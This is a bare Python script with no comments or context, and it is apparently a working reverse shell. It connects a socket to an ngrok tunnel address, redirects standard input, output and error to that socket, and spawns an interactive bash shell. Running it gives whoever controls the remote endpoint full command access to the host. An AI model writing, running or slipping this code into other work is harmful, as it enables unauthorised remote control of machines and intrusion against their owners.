import os
import pty
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("5.tcp.eu.ngrok.io", 20510))

for i in range(3):
  os.dup2(s.fileno(), i)

pty.spawn("bash")
